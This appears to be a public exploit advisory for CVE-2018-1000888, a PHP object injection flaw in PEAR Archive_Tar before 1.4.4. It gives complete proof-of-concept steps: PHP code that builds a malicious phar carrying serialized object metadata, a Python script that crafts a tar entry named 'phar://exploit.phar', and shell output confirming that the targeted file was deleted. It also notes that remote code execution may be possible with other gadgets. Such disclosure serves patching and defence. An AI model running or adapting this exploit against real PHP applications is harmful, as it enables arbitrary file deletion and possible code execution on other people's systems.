@@ -1,0 +1,81 @@
+PEAR Archive_Tar < 1.4.4 - PHP Object Injection
+
+Date:
+  January 10, 2019
+
+Author:
+  farisv
+
+Vendor Homepage:
+  https://pear.php.net/package/Archive_Tar/
+
+Vulnerable Package Link:
+  http://download.pear.php.net/package/Archive_Tar-1.4.3.tgz
+
+CVE:
+  CVE-2018-1000888
+
+In PEAR Archive_Tar before 1.4.4, there are several file operation with `$v_header['filename']` as parameter (such as file_exists, is_file, is_dir, etc). When extract() is called without a specific prefix path, we can trigger phar induced unserialization by crafting a tar file with `phar://[path_to_malicious_phar_file]` as path name. Object injection can be used to trigger destructor/wakeup method in the loaded PHP classes, e.g. the Archive_Tar class itself. With Archive_Tar itself, we can trigger arbitrary file deletion because `@unlink($this->_temp_tarname)` will be called in the destructor method. If another class with useful gadget is loaded, remote code execution may be possible.
+
+
+Steps to reproduce object injection and arbitrary file deletion:
+
+1. Make sure that PHP & PEAR are installed.
+2. Download vulnerable PEAR Archive_Tar.
+
+$ wget http://download.pear.php.net/package/Archive_Tar-1.4.3.tgz
+$ tar xfz Archive_Tar-1.4.3.tgz
+$ cd Archive_Tar-1.4.3
+
+3. Create vulnerable code (vulnerable.php).
+
+```
+<?php
+  require 'Archive/Tar.php';
+
+  $exploit = new Archive_Tar('exploit.tar');
+  $exploit->extract();
+```
+
+4. Create dummy file /tmp/test.
+
+$ touch /tmp/test
+
+5. Genereate exploit.phar with the following PHP code and place the exploit.phar in the same directory with vulnerable.php.
+
+```
+<?php
+
+class Archive_Tar {
+  public $_temp_tarname;
+}
+
+$phar = new Phar('exploit.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ? >');
+
+$object = new Archive_Tar;
+$object->_temp_tarname = '/tmp/test';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+```
+
+6. Create exploit.tar with the following Python code.
+
+```
+import tarfile
+
+tf = tarfile.open('exploit.tar', 'w')
+
+tf.add('/dev/null', 'phar://exploit.phar')
+tf.close()
+```
+
+7. Execute vulnerable.php to trigger object injection to delete /tmp/test.
+
+$ ls -alt /tmp/test
+-rw-rw-r-- 1 vagrant vagrant 0 Jan  9 16:41 /tmp/test
+$ php vulnerable.php
+$ ls -alt /tmp/test
+ls: cannot access '/tmp/test': No such file or directory
